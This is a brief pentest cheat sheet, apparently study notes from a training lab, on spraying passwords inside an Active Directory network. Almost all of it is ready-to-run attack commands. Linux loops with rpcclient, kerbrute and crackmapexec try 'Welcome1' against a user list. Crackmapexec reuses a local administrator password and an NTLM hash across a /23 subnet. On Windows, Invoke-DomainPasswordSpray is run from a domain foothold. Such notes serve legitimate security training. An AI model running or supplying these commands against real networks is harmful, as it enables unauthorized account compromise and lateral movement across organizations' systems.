# Internal Password Spraying

## From Linux

### Different tools to spray Welcome1 Password :

```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" $TARGET | grep Authority; done
kerbrute passwordspray -d inlanefreight.local --dc $TARGET valid_users.txt  Welcome1
sudo crackmapexec smb $TARGET -u valid_users.txt -p Welcome1 | grep +
```

### Validate Credentials :&#x20;

```
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

### Local Administrator Password Reuse :&#x20;

When we find a common used password (or hash), we can try to use onto other machines locally on the network

```
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -p Welcome1 | grep +
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## From Windows

From a foothold on a domain-joined Windows host : DomainPasswordSpray tool is highly effective :

```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

```
